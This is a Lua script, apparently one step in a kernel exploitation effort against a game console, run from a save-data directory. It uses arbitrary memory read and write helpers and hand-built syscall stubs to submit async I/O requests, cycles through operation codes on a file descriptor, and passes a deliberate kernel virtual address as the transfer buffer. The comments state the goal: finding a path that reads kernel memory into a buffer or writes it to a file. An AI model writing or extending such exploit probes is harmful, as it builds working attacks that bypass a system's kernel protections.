-- CRASH_CLASS: HIGH
-- PROBE 748a: aio on a file, the operation field, and a kernel buffer address
--
-- 747a: a socket block read with buf=0x1000 completes and reports EFAULT
-- (0x8002000E), while a file block read with the same buffer killed the
-- process after create returned. So the vnode path does not fail the way the
-- socket path does. Two questions remain:
--   B: what does the descriptor dword at +0x24 select? op 0..3 on a file.
--   C: is a kernel address rejected before the transfer, as the socket path
--      rejects a kernel result pointer (745a)? An unmapped kernel VA is the
--      safe form of that test: if a range check exists the request completes
--      with an error record, if it does not the process dies as in 747a.
-- C runs last so it cannot hide B.
--
-- The file path may be able to read kernel memory into a buffer, or write a
-- buffer into a file. Keep every address used for a transfer inside our own
-- mapped pages except the single deliberate kernel VA in C.

print("=== PROBE 748a: AIO FILE OP MATRIX ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local U = function(a) a=to_num(a); return uint64(string.format("0x%08X%08X", math.floor(a/4294967296), a%4294967296)) end
local sc_open = mk(5); local sc_write = mk(4); local sc_read = mk(3)
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end
local function call(sc, a1, a2, a3, a4, a5, a6)
    local ok, r = pcall(function() return sc(U(a1), U(a2), U(a3), U(a4), U(a5), U(a6)) end)
    if not ok then return "DEAD" end
    return to_num(r)
end
local ts = memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8, ms*1000000); pcall(function() mk(240)(U(ts), U(0)) end) end
local function path(s)
    local b = to_num(memory.alloc(#s+1))
    for i=1,#s do memory.write_byte(b+i-1, s:byte(i)) end
    memory.write_byte(b+#s, 0)
    return b
end
print("[A] pid="..tostring(call(syscall.pipe, 20, 0,0,0,0,0,0)))

local fd_ro = call(sc_open, path("/savedata0/thread.lua"), 0, 0, 0, 0, 0)
print("[A] open ro thread.lua -> "..tostring(fd_ro))
local fd_rw = call(sc_open, path("/savedata0/thread.lua"), 2, 0, 0, 0, 0)
print("[A] open rw thread.lua -> "..tostring(fd_rw))

local D = to_num(memory.alloc(0x4000)); local buf = to_num(memory.alloc(0x4000)); local res = to_num(memory.alloc(0x4000))
local ids = to_num(memory.alloc(0x400)); local st = to_num(memory.alloc(0x400)); local ds = to_num(memory.alloc(0x400))
zero(D,0x4000); zero(buf,0x4000); zero(res,0x4000); zero(st,0x400); zero(ds,0x400)
for k=0,3 do wd(buf+k*4, 0x51515151) end

local function attempt(tag, fd, b, r, op, len)
    zero(D,0x100); zero(res,0x40)
    wq(D+0x00, uint64(0)); wq(D+0x08, uint64(len or 16))
    wq(D+0x10, uint64(b)); wq(D+0x18, uint64(r))
    wd(D+0x20, fd); wd(D+0x24, op or 0)
    wd(ids, 0)
    local cr = call(mk(669), 1+0x1000, D, 1, 1, ids, 0)
    local id = rd(ids)
    print(string.format("%s create ret=%s id=%08X", tag, tostring(cr), id))
    if id == 0 or id == -1 then return end
    sleep_ms(40)
    wd(ids, id); call(mk(664), ids, 1, st, 0, 0, 0)
    print(string.format("%s state=%08X res=%X %X %X %X buf=%X %X", tag, rd(st), rd(r), rd(r+4), rd(r+8), rd(r+12), rd(b), rd(b+4)))
    wd(ids, id); call(mk(662), ids, 1, ds, 0, 0, 0)
    print(string.format("%s delete=%08X", tag, rd(ds)))
end

if type(fd_rw) == "number" and fd_rw > 2 then
    for op=0,3 do
        attempt(string.format("[B] rw op=%d", op), fd_rw, buf, res, op, 16)
    end
    print("[B] health="..tostring(call(syscall.pipe, 20, 0,0,0,0,0,0)))
end

if type(fd_ro) == "number" and fd_ro > 2 then
    attempt("[C] kernel va buf", fd_ro, 0xFFFFFFFFFF000000, res, 0, 16)
end
print("[D] health="..tostring(call(syscall.pipe, 20, 0,0,0,0,0,0)))
print("=== 748a DONE ===")
